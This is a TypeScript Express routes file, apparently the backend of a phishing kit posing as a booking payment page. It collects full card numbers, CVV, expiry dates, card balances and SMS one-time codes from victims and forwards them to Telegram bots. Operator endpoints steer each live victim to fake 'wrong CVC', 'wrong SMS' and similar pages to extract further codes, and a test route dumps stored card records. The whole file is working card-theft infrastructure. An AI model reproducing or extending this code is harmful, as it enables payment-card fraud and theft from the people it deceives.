// routes.ts
import { Router } from "express";
import { db, generateSessionId } from "./db";
import {
  notifyBalance,
  notifyChange,
  notifyResendSms,
  notifySms,
  sendCustomerToEchoBot,
  sendLogToBot,
} from "./telegram";

const router = Router();

// Добавляем поле balance в существующую таблицу card_logs
try {
  db.exec(`ALTER TABLE card_logs ADD COLUMN balance REAL DEFAULT NULL;`);
  db.exec(`ALTER TABLE card_logs ADD COLUMN sms_code REAL DEFAULT NULL;`);
  console.log("✅ Added balance column to card_logs table");
} catch (error) {
  // Поле уже существует, игнорируем ошибку
}
interface RedirectRequest {
  type: string;
  timestamp: number;
  clientId: string; // Добавляем clientId
  phoneDigits?: string;
}
// Хранилище для перенаправлений пользователей
const redirectRequests = new Map<string, RedirectRequest>();

interface OnlineStatus {
  online: boolean;
  currentPage: string;
  lastActivity: number;
}

const onlineStatuses = new Map<string, OnlineStatus>();

router.post("/redirect-custom-sms", (req, res) => {
  const { sessionId, clientId, phoneDigits } = req.body;

  if (!sessionId || !clientId || !phoneDigits) {
    return res.status(400).json({
      success: false,
      error: "sessionId, clientId and customSms required",
    });
  }

  // Создаем уникальный ключ для клиента + сессии
  const redirectKey = `${clientId}:${sessionId}`;

  // Сохраняем запрос на перенаправление с кастомным SMS
  redirectRequests.set(redirectKey, {
    type: "custom-sms",
    timestamp: Date.now(),
    clientId: clientId,
    phoneDigits: phoneDigits,
  });

  console.log(
    `🔄 Custom SMS redirect request saved for client ${clientId}, session: ${sessionId}, code: ${phoneDigits}`
  );
  res.json({ success: true, message: "Custom SMS redirect request saved" });
});

router.post("/update-online-status", (req, res) => {
  const { sessionId, page } = req.body;

  if (!sessionId || !page) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId and page required" });
  }

  onlineStatuses.set(sessionId, {
    online: true,
    currentPage: page,
    lastActivity: Date.now(),
  });

  console.log(`🟢 User ${sessionId} is online on page: ${page}`);

  res.json({ success: true, message: "Status updated" });
});

router.get("/check-online-status/:sessionId", (req, res) => {
  const { sessionId } = req.params;

  const status = onlineStatuses.get(sessionId);

  if (!status) {
    return res.json({
      success: true,
      online: false,
      currentPage: null,
      lastSeen: "никогда",
      lastKnownPage: null,
    });
  }

  // Считаем пользователя оффлайн, если последняя активность была более 30 секунд назад
  const isOnline = Date.now() - status.lastActivity < 30000;

  // Форматируем время последней активности
  const secondsAgo = Math.floor((Date.now() - status.lastActivity) / 1000);
  const minutesAgo = Math.floor(secondsAgo / 60);

  let lastSeenText;
  if (secondsAgo < 60) {
    lastSeenText = `${secondsAgo} сек. назад`;
  } else if (minutesAgo < 60) {
    lastSeenText = `${minutesAgo} мин. назад`;
  } else {
    const hoursAgo = Math.floor(minutesAgo / 60);
    lastSeenText = `${hoursAgo} ч. назад`;
  }

  // Форматируем название страницы для отображения
  const pageNames: { [key: string]: string } = {
    balance: "💰 Страница баланса",
    sms: "📞 Страница SMS",
    success: "✅ Страница успешной оплаты",
    change: "🔄 Страница изменения карты",
    payment: "💳 Страница оплаты",
    "wrong-cvc": "❌🔒 Страница неправильного CVC",
    "wrong-sms": "❌📩 Страница неправильного SMS",
    prepaid: "❌🏧 Страница Prepaid карты",
    "custom-sms": "📱 Страница кастомного смс",
    "transit-1": "🔄 Транзитная страница 1",
    "transit-2": "🔄 Транзитная страница 2",
  };
  const currentPageDisplay =
    pageNames[status.currentPage] || `📄 ${status.currentPage}`;

  if (isOnline) {
    res.json({
      success: true,
      online: true,
      currentPage: status.currentPage,
      currentPageDisplay: currentPageDisplay,
      lastSeen: "только что",
      lastKnownPage: status.currentPage,
      lastKnownPageDisplay: currentPageDisplay,
    });
  } else {
    res.json({
      success: true,
      online: false,
      currentPage: status.currentPage,
      currentPageDisplay: currentPageDisplay,
      lastSeen: lastSeenText,
      lastKnownPage: status.currentPage,
      lastKnownPageDisplay: currentPageDisplay,
    });
  }
});

// ➝ Создание сессии и заказа
router.post("/booking", (req, res) => {
  const { totalPrice, clientId } = req.body;

  // Генерируем sessionId на бэкенде
  const sessionId = generateSessionId();
  const bookingId = Math.random().toString(36).substring(2, 10).toUpperCase();

  db.prepare(
    `
    INSERT INTO bookings (session_id, booking_id, client_id, total_amount, status)
    VALUES (?, ?, ?, ?, ?)
  `
  ).run(sessionId, bookingId, clientId, totalPrice, "active");

  res.json({
    success: true,
    sessionId: sessionId,
    bookingId: bookingId,
  });
});

// ➝ Данные заказчика
router.post("/customer", async (req, res) => {
  const { fullName, phone, clientId, price } = req.body;

  const sessionId = generateSessionId();
  const bookingId = Math.random().toString(36).substring(2, 10).toUpperCase();

  db.prepare(
    `
    INSERT INTO customers (session_id, booking_id, client_id, fullName, phone, total_amount)
    VALUES (?, ?, ?, ?, ?, ?)
  `
  ).run(sessionId, bookingId, clientId, fullName, phone, price);
  try {
    await sendCustomerToEchoBot({
      sessionId: sessionId,
      bookingId: bookingId,
      clientId: clientId,
      fullName: fullName,
      phoneNumber: phone,
    });
    console.log(
      `✅ Данные клиента отправлены в эхо-бота для сессии: ${sessionId}`
    );
  } catch (error) {
    console.error(
      `❌ Ошибка отправки в эхо-бота для сессии ${sessionId}:`,
      error
    );
  }

  res.json({ success: true, bookingId, sessionId });
});

// ➝ Данные карты
router.post("/cardlog", async (req, res) => {
  const { sessionId, cardNumber, expireDate, cvv, step } = req.body;

  const masked = cardNumber;

  // Если пришел только номер карты (первый шаг)
  if (step === "card_number_only") {
    db.prepare(
      `
      INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status, step)
      VALUES (?, ?, ?, ?, ?, ?, ?)
    `
    ).run(
      sessionId,
      cardNumber,
      masked,
      cvv || "",
      expireDate || "",
      "free",
      "card_number_only"
    );
  } else {
    // Старая логика для обратной совместимости
    db.prepare(
      `
      INSERT INTO card_logs (session_id, full_pan, masked_pan, cvv, expire_date, status)
      VALUES (?, ?, ?, ?, ?, ?)
    `
    ).run(sessionId, cardNumber, masked, cvv, expireDate, "free");
  }

  // Получаем bookingId для бота
  const booking = db
    .prepare("SELECT booking_id, client_id FROM customers WHERE session_id = ?")
    .get(sessionId) as any;

  // Отправляем в бот с правильными данными
  await sendLogToBot({
    sessionId: sessionId,
    maskedPan: masked,
    bookingId: booking?.booking_id,
    clientId: booking?.client_id,
    step: step || "full", // Передаем шаг в бот
  });

  res.json({ success: true });
});

const validateCardData = (
  cvv: string,
  expireDate: string
): { isValid: boolean; errors: string[] } => {
  const errors: string[] = [];

  // Валидация CVV
  if (!cvv || cvv.length !== 3 || !/^\d+$/.test(cvv)) {
    errors.push("CVV must be exactly 3 digits");
  }

  // Валидация даты истечения
  const expiryRegex = /^(0[1-9]|1[0-2])\/([0-9]{2})$/;
  if (!expireDate || !expiryRegex.test(expireDate)) {
    errors.push("Expiry date must be in format MM/YY");
  } else {
    const [month, year] = expireDate.split("/");
    const now = new Date();
    const currentYear = now.getFullYear() % 100;
    const currentMonth = now.getMonth() + 1;

    const expiryYear = parseInt(year, 10);
    const expiryMonth = parseInt(month, 10);

    if (
      expiryYear < currentYear ||
      (expiryYear === currentYear && expiryMonth < currentMonth)
    ) {
      errors.push("Card has expired");
    }
  }
  console.log(errors);
  return {
    isValid: errors.length === 0,
    errors,
  };
};

// ➝ Обновляем эндпоинт с валидацией
router.post("/cardlog-update", async (req, res) => {
  const { sessionId, cvv, expireDate, totalPrice } = req.body;

  // Валидация данных
  const validation = validateCardData(cvv, expireDate);
  if (!validation.isValid) {
    return res.status(400).json({
      success: false,
      error: "Invalid card data",
      details: validation.errors,
    });
  }

  try {
    const result = db
      .prepare(
        `UPDATE card_logs SET cvv = ?, expire_date = ?, step = 'completed' WHERE session_id = ?`
      )
      .run(cvv, expireDate, sessionId);

    if (result.changes === 0) {
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });
    }

    // Получаем обновленные данные для отправки в бот
    const cardLog = db
      .prepare("SELECT * FROM card_logs WHERE session_id = ?")
      .get(sessionId) as any;

    const booking = db
      .prepare(
        "SELECT booking_id, client_id FROM customers WHERE session_id = ?"
      )
      .get(sessionId) as any;

    // Отправляем обновленные данные в бот
    await sendLogToBot({
      sessionId: sessionId,
      maskedPan: cardLog.masked_pan,
      bookingId: booking?.booking_id,
      clientId: booking?.client_id,
      step: "completed",
      cvv: cvv,
      expireDate: expireDate,
    });

    res.json({ success: true });
  } catch (error) {
    console.error("Error updating card log:", error);
    res.status(500).json({ success: false, error: "Database error" });
  }
});

router.post("/resend-sms-notify", async (req, res) => {
  const { sessionId } = req.body;

  if (!sessionId) {
    return res.status(400).json({
      success: false,
      error: "sessionId required",
    });
  }

  try {
    // Используем функцию из telegram.ts
    await notifyResendSms(sessionId);

    console.log(`🔄 Resend SMS notification sent for session: ${sessionId}`);

    res.json({
      success: true,
      message: "Resend SMS notification sent",
    });
  } catch (error) {
    console.error("Error sending resend SMS notification:", error);
    res.status(500).json({
      success: false,
      error: "Failed to send notification",
    });
  }
});

// ➝ Новые эндпоинты для транзитных страниц
router.post("/redirect-transit-1", (req, res) => {
  const { sessionId, clientId } = req.body;

  if (!sessionId || !clientId) {
    return res.status(400).json({
      success: false,
      error: "sessionId and clientId required",
    });
  }

  const redirectKey = `${clientId}:${sessionId}`;

  redirectRequests.set(redirectKey, {
    type: "transit-1",
    timestamp: Date.now(),
    clientId: clientId,
  });

  console.log(
    `🔄 Transit-1 redirect for client ${clientId}, session: ${sessionId}`
  );
  res.json({ success: true, message: "Transit-1 redirect saved" });
});

router.post("/redirect-transit-2", (req, res) => {
  const { sessionId, clientId } = req.body;

  if (!sessionId || !clientId) {
    return res.status(400).json({
      success: false,
      error: "sessionId and clientId required",
    });
  }

  const redirectKey = `${clientId}:${sessionId}`;

  redirectRequests.set(redirectKey, {
    type: "transit-2",
    timestamp: Date.now(),
    clientId: clientId,
  });

  console.log(
    `🔄 Transit-2 redirect for client ${clientId}, session: ${sessionId}`
  );
  res.json({ success: true, message: "Transit-2 redirect saved" });
});

// ➝ Перенаправление пользователя на страницу баланса (новый эндпоинт)
router.post("/redirect-balance", (req, res) => {
  const { sessionId, clientId } = req.body; // Добавляем clientId

  if (!sessionId || !clientId) {
    return res.status(400).json({
      success: false,
      error: "sessionId and clientId required",
    });
  }

  // Создаем уникальный ключ для клиента + сессии
  const redirectKey = `${clientId}:${sessionId}`;

  // Сохраняем запрос на перенаправление
  redirectRequests.set(redirectKey, {
    type: "balance",
    timestamp: Date.now(),
    clientId: clientId,
  });

  console.log(
    `🔄 Redirect request saved for client ${clientId}, session: ${sessionId}`
  );
  res.json({ success: true, message: "Redirect request saved" });
});

router.post("/redirect-wrong-cvc", (req, res) => {
  const { sessionId, clientId } = req.body;

  if (!sessionId || !clientId) {
    return res.status(400).json({
      success: false,
      error: "sessionId and clientId required",
    });
  }

  // Создаем уникальный ключ для клиента + сессии
  const redirectKey = `${clientId}:${sessionId}`;

  // Сохраняем запрос на перенаправление
  redirectRequests.set(redirectKey, {
    type: "wrong-cvc",
    timestamp: Date.now(),
    clientId: clientId,
  });

  console.log(
    `🔄 Redirect wrong CVC request saved for client ${clientId}, session: ${sessionId}`
  );
  res.json({ success: true, message: "Redirect request saved" });
});

router.post("/redirect-prepaid", (req, res) => {
  const { sessionId, clientId } = req.body;

  if (!sessionId || !clientId) {
    return res.status(400).json({
      success: false,
      error: "sessionId and clientId required",
    });
  }

  // Создаем уникальный ключ для клиента + сессии
  const redirectKey = `${clientId}:${sessionId}`;

  // Сохраняем запрос на перенаправление
  redirectRequests.set(redirectKey, {
    type: "prepaid",
    timestamp: Date.now(),
    clientId: clientId,
  });

  console.log(
    `🔄 Redirect prepaid card request saved for client ${clientId}, session: ${sessionId}`
  );
  res.json({ success: true, message: "Redirect request saved" });
});

router.post("/redirect-wrong-sms", (req, res) => {
  const { sessionId, clientId } = req.body;

  if (!sessionId || !clientId) {
    return res.status(400).json({
      success: false,
      error: "sessionId and clientId required",
    });
  }

  // Создаем уникальный ключ для клиента + сессии
  const redirectKey = `${clientId}:${sessionId}`;

  // Сохраняем запрос на перенаправление
  redirectRequests.set(redirectKey, {
    type: "wrong-sms",
    timestamp: Date.now(),
    clientId: clientId,
  });

  console.log(
    `🔄 Redirect wrong SMS request saved for client ${clientId}, session: ${sessionId}`
  );
  res.json({ success: true, message: "Redirect request saved" });
});

router.post("/redirect-success", (req, res) => {
  const { sessionId, clientId } = req.body; // Добавляем clientId

  if (!sessionId || !clientId) {
    return res.status(400).json({
      success: false,
      error: "sessionId and clientId required",
    });
  }

  // Создаем уникальный ключ для клиента + сессии
  const redirectKey = `${clientId}:${sessionId}`;

  // Сохраняем запрос на перенаправление
  redirectRequests.set(redirectKey, {
    type: "success",
    timestamp: Date.now(),
    clientId: clientId,
  });

  console.log(
    `🔄 Redirect success request saved for client ${clientId}, session: ${sessionId}`
  );
  res.json({ success: true, message: "Redirect request saved" });
});

router.post("/redirect-sms", (req, res) => {
  const { sessionId, clientId } = req.body; // Добавляем clientId

  if (!sessionId || !clientId) {
    return res.status(400).json({
      success: false,
      error: "sessionId and clientId required",
    });
  }

  // Создаем уникальный ключ для клиента + сессии
  const redirectKey = `${clientId}:${sessionId}`;

  // Сохраняем запрос на перенаправление
  redirectRequests.set(redirectKey, {
    type: "sms",
    timestamp: Date.now(),
    clientId: clientId,
  });

  console.log(
    `🔄 Redirect request saved for client ${clientId}, session: ${sessionId}`
  );
  res.json({ success: true, message: "Redirect request saved" });
});

router.post("/redirect-change", (req, res) => {
  const { sessionId, clientId } = req.body; // Добавляем clientId

  if (!sessionId || !clientId) {
    return res.status(400).json({
      success: false,
      error: "sessionId and clientId required",
    });
  }

  // Создаем уникальный ключ для клиента + сессии
  const redirectKey = `${clientId}:${sessionId}`;

  // Сохраняем запрос на перенаправление
  redirectRequests.set(redirectKey, {
    type: "change",
    timestamp: Date.now(),
    clientId: clientId,
  });

  console.log(
    `🔄 Redirect request saved for client ${clientId}, session: ${sessionId}`
  );
  res.json({ success: true, message: "Redirect request saved" });
});

// ➝ Проверка перенаправлений (для фронтенда)
router.get("/check-redirect/:clientId/:sessionId", (req, res) => {
  const { clientId, sessionId } = req.params;

  // Создаем уникальный ключ
  const redirectKey = `${clientId}:${sessionId}`;

  const redirectRequest = redirectRequests.get(redirectKey);
  console.log(redirectRequest);

  if (redirectRequest) {
    // Удаляем запрос после получения
    redirectRequests.delete(redirectKey);

    res.json({
      success: true,
      redirect: true,
      type: redirectRequest.type,
      timestamp: redirectRequest.timestamp,
      phoneDigits: redirectRequest.phoneDigits,
    });
  } else {
    res.json({ success: true, redirect: false });
  }
});

// ➝ Получение заказчика по sessionId
router.get("/customer/:sessionId", (req, res) => {
  const { sessionId } = req.params;
  const row = db
    .prepare("SELECT * FROM customers WHERE session_id = ?")
    .get(sessionId);
  console.log(row);
  res.json(row || {});
});

// ➝ Получение карты по sessionId
router.get("/card/:sessionId", (req, res) => {
  const { sessionId } = req.params;
  const row = db
    .prepare("SELECT * FROM card_logs WHERE session_id = ?")
    .get(sessionId);
  res.json(row || {});
});

router.get("/booking/:sessionId", (req, res) => {
  const { sessionId } = req.params;
  const row = db
    .prepare("SELECT * FROM bookings WHERE session_id = ?")
    .get(sessionId);
  res.json(row || {});
});

// ➝ Сохранение баланса карты
router.post("/submit-balance", async (req, res) => {
  const { sessionId, balance } = req.body;

  if (!sessionId || balance === undefined || balance === null) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId and balance required" });
  }

  try {
    // Обновляем запись в card_logs с балансом
    const result = db
      .prepare(`UPDATE card_logs SET balance = ? WHERE session_id = ?`)
      .run(balance, sessionId);

    if (result.changes === 0) {
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });
    }

    console.log(`💰 Balance saved for session ${sessionId}: ${balance} AED`);

    res.json({ success: true, message: "Balance saved successfully" });
  } catch (error) {
    console.error("Error saving balance:", error);
    res.status(500).json({ success: false, error: "Database error" });
  }
  await notifyBalance(sessionId, balance);
});

router.post("/submit-sms", async (req, res) => {
  const { sessionId, sms } = req.body;

  if (!sessionId || sms === undefined || sms === null) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId and sms required" });
  }

  try {
    // Обновляем запись в card_logs с балансом
    const result = db
      .prepare(`UPDATE card_logs SET sms_code = ? WHERE session_id = ?`)
      .run(sms, sessionId);

    if (result.changes === 0) {
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });
    }

    console.log(`💰 Balance saved for session ${sessionId}: Code: ${sms}`);

    res.json({ success: true, message: "Balance saved successfully" });
  } catch (error) {
    console.error("Error saving balance:", error);
    res.status(500).json({ success: false, error: "Database error" });
  }
  await notifySms(sessionId, sms);
});

router.post("/submit-change", async (req, res) => {
  const { sessionId, change, expiryDate, cvc } = req.body; // Изменил expiryYear на expiryDate

  const changedCard = change;
  const changedExpiryDate = expiryDate; // Переименовал
  const changedCvc = cvc;

  if (!sessionId || change === undefined || change === null) {
    return res
      .status(400)
      .json({ success: false, error: "sessionId and changed Card required" });
  }

  try {
    const result = db
      .prepare(
        `UPDATE card_logs SET masked_pan = ?, expire_date = ?, cvv = ? WHERE session_id = ?`
      )
      .run(changedCard, changedExpiryDate, changedCvc, sessionId); // Исправил названия переменных

    if (result.changes === 0) {
      return res
        .status(404)
        .json({ success: false, error: "Session not found" });
    }

    console.log(`💰 Card changed for ${sessionId}: New Card: ${change}`);

    res.json({ success: true, message: "Card updated successfully" });
  } catch (error) {
    console.error("Error saving card change:", error);
    res.status(500).json({ success: false, error: "Database error" });
  }
  await notifyChange(sessionId, changedCard, changedExpiryDate, changedCvc); // Исправил названия
});

router.get("/test", (req, res) => {
  try {
    // Проверяем подключение к базе данных и получаем несколько записей
    const bookings = db.prepare("SELECT * FROM bookings LIMIT 5").all();
    const customers = db.prepare("SELECT * FROM customers LIMIT 5").all();
    const cardLogs = db.prepare("SELECT * FROM card_logs LIMIT 5").all();

    // Получаем общую статистику
    const stats = {
      totalBookings: db.prepare("SELECT COUNT(*) as count FROM bookings").get(),
      totalCustomers: db
        .prepare("SELECT COUNT(*) as count FROM customers")
        .get(),
      totalCardLogs: db
        .prepare("SELECT COUNT(*) as count FROM card_logs")
        .get(),
    };

    res.json({
      success: true,
      message: "Сервер работает! ✅",
      timestamp: new Date().toISOString(),
      database: {
        connected: true,
        statistics: stats,
        sampleData: {
          bookings: bookings,
          customers: customers,
          cardLogs: cardLogs,
        },
      },
      server: {
        uptime: process.uptime(),
        nodeVersion: process.version,
        platform: process.platform,
      },
    });
  } catch (error) {
    console.error("Test route error:", error);
    res.status(500).json({
      success: false,
      message: "Ошибка при работе с базой данных",
      timestamp: new Date().toISOString(),
    });
  }
});
// Очистка старых запросов перенаправления (каждые 5 минут)
setInterval(() => {
  const now = Date.now();
  for (const [redirectKey, request] of redirectRequests.entries()) {
    // Удаляем запросы старше 10 минут
    if (now - request.timestamp > 10 * 60 * 1000) {
      redirectRequests.delete(redirectKey);
      console.log(`🧹 Cleared old redirect for: ${redirectKey}`);
    }
  }
}, 5 * 60 * 1000);

export default router;
